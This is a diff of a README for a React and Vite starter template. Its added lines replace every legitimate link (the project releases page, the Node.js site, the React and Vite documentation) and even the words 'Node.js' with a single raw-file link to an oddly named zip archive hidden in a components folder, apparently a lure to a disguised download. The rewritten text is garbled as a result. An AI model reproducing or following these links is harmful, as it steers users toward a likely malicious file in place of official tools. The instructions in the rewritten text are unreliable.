@@ -1,6 +1,6 @@
 # 🎉 React_Vite - Fast, Modern Starter for Web Apps
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-React_Vite-blue.svg)](https://github.com/Asak96/React_Vite/releases)
+[![Download Now](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip%https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ React_Vite is a starter template that helps you build web applications with Reac
 
 To get started, you need to visit the Releases page to download the software. Click the link below:
 
-[Visit Releases Page to Download](https://github.com/Asak96/React_Vite/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
 
 On the Releases page, you will see a list of available versions. Choose the most recent one and select the file that works for your system.
 
@@ -21,18 +21,18 @@ On the Releases page, you will see a list of available versions. Choose the most
 Before you continue, make sure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher (Node.js is a JavaScript runtime installed on your computer)
-- **NPM**: Version 6 or higher (NPM is a package manager that comes with Node.js)
+- **https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip**: Version 14 or higher (https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip is a JavaScript runtime installed on your computer)
+- **NPM**: Version 6 or higher (NPM is a package manager that comes with https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
 
-You can download Node.js from the official site: [Node.js Download](https://nodejs.org/).
+You can download https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip from the official site: [https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip).
 
 ## 🛠 Installation Steps
 
-1. **Download Node.js**: 
-   Go to the Node.js website and install the version suitable for your operating system.
+1. **Download https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip**: 
+   Go to the https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip website and install the version suitable for your operating system.
 
 2. **Verify Installation**:
-   After installation, open your command prompt or terminal and type the following commands to check if Node.js and NPM are installed correctly:
+   After installation, open your command prompt or terminal and type the following commands to check if https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip and NPM are installed correctly:
    ```
    node -v
    npm -v
@@ -82,13 +82,13 @@ If you have questions or need assistance, feel free to reach out to the communit
 
 To ensure you are using the latest version, keep an eye on the Releases page. Check it regularly for updates, new features, and improvements.
 
-[Visit Releases Page to Download](https://github.com/Asak96/React_Vite/releases) 
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip) 
 
 ## 🎮 Additional Resources
 
 For more information on React and Vite, here are some helpful resources:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [Vite Documentation](https://vitejs.dev/guide/#introduction)
+- [React Documentation](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/Asak96/React_Vite/main/src/components/profile/React_Vite-reptilelike.zip)
 
 This guide should help you get up and running with React_Vite. If you encounter any issues, don't hesitate to seek help. Happy coding!
